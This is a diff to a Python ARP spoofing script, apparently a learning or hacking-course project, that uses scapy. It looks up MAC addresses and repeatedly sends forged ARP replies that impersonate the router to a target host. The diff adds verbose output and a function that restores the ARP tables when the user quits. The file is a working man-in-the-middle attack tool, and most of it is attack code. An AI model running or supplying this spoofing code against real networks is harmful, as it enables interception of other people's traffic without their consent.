@@ -24,6 +24,7 @@ def get_arguments():
     args = parser.parse_args()
     if args.verbose:
         print("[+] verbosity turned on")
+        print(args.target, args.router)
     if not args.router:
         parser.error("[-] Please specify a router IP or use --help for more info.")
     if not args.target:
@@ -36,24 +37,28 @@ def get_mac(host):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     targets_found = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    # print("target_found is " + targets_found)
     target_mac_address = targets_found[0][1].hwsrc
-    # if args.verbose:
-    #     print("Target MAC: " + target_mac_address)
+    if args.verbose:
+        print("[+] Target MAC: " + target_mac_address)
     return(target_mac_address)
 
 def spoof(target, spoof):
     ''' TODO '''
-    target_mac = get_mac(target) # TODO - this is ineffcient to keep fetching the mac here. Prefetch outside the spoof funtion in a dict target.ip, target.mac 
+    target_mac = get_mac(target) # TODO - this is inefficient to keep fetching the mac here. Prefetch outside the spoof function in a dict target.ip, target.mac 
     packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
-    # if args.verbose:
-    #     print(packet.show())
-    #     print(packet.summary())
+    if args.verbose:
+        print(packet.show())
+        print(packet.summary())
     scapy.send(packet, verbose=False)
 
-# def restore_arp(destination_ip, source_ip):
-#     destination_mac = get_mac(options)
-#     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=)
+def restore_arp(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    if args.verbose:
+        print(packet.show())
+        print(packet.summary())
+    scapy.send(packet, verbose=False)
 
 args = get_arguments()
 # print(args)
@@ -73,3 +78,4 @@ try:
         sleep(1)
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL +C .... Quitting.")
+    restore_arp(args.target, args.router)
